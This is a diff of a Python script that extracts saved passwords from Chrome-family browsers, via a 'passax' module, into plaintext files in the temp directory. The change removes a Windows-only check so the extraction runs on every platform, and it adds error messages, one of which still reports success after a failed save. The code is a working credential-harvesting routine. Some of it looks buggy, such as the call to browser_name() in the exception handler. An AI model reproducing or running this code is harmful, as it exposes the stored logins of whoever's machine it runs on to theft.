@@ -12,7 +12,8 @@ from requests import get
 
 sys_ = platform.system()
 # Get the temp path for every system
-TEMP_PATH = r"C:\Users\{}\AppData\Local\Temp".format(getpass.getuser()) if sys_ == "Windows" else "/tmp"
+TEMP_PATH = r"C:\Users\{}\AppData\Local\Temp".format(
+    getpass.getuser()) if sys_ == "Windows" else "/tmp"
 
 # Importing passax for the target platform
 if sys_ == "Windows":
@@ -64,14 +65,15 @@ def main():
 
         try:
             filename = join(TEMP_PATH, f"{browser_name}.txt")
-            if platform.system() == "Windows":
-                win = psx.Chrome(browser, blank_passwords=False)
-                logging.info(f"Getting database paths and keys for {platform.system()}...")
-                win.fetch()
-                logging.info("Fetching database values...")
-                win.retrieve_database()
-                win.save(filename)
-                logging.info(f"File saved to: {filename}")
+            win = psx.Chrome(browser, blank_passwords=False)
+            logging.info(
+                f"Getting database paths and keys for {platform.system()}...")
+            win.fetch()
+            logging.info("Fetching database values...")
+            win.retrieve_database()
+            if not win.save(filename):
+                print(f"Couldn't save: {filename}!")
+            logging.info(f"File saved to: {filename}")
 
         except Exception as E:
             print(f"\nSkipping {browser_name()}\n")
